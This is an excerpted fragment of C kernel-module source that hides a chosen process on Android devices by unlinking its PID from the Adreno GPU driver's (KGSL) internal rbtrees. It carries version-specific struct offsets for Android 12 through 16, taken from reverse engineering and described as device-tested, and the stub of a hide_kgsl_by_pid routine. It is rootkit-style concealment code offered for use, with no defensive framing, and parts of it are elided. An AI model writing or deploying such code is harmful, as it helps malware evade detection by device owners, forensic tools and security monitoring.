...
/* GPU(KGSL/Adreno) process concealment: unlink target PID from kgsl_driver rbtrees. Offsets come from reversal of the enen family, with runtime holder-pointer checks for BSP drift. */
...
/* 5.10 (Android 12): single holder; the second holder did not exist yet. */
#define KGSL_HOLDER_A_OFFSET 0x420
#define KGSL_HAS_HOLDER_B 0
#define KGSL_INNER_STATE_OFFSET 0x70
#elif LINUX_VERSION_CODE < KERNEL_VERSION(6, 6, 0)
/* 5.15 / 6.1 (Android 13 / 14): second holder added; inner layout unchanged. */
#define KGSL_HOLDER_A_OFFSET 0x430
#define KGSL_HOLDER_B_OFFSET 0x428
#define KGSL_HAS_HOLDER_B 1
#define KGSL_INNER_STATE_OFFSET 0x70
#elif LINUX_VERSION_CODE < KERNEL_VERSION(6, 12, 0)
/* 6.6 (Android 15): kgsl_driver grew before both holders; this profile is device-tested. */
#define KGSL_HOLDER_A_OFFSET 0x448
#define KGSL_HOLDER_B_OFFSET 0x440
#define KGSL_HAS_HOLDER_B 1
#define KGSL_INNER_STATE_OFFSET 0x70
#else
/* 6.12+ (Android 16): holder offsets reverted while the inner state moved to +0x3C. */
#define KGSL_HOLDER_A_OFFSET 0x430
#define KGSL_HOLDER_B_OFFSET 0x428
#define KGSL_HAS_HOLDER_B 1
...
/* These inner offsets are stable across profiles; only the state offset moves on 6.12+. */
...
long hide_kgsl_by_pid(void *kgsl_driver, int target_pid) {
	...
	/* Validate both holders before touching either to avoid a partial erase on layout drift. */
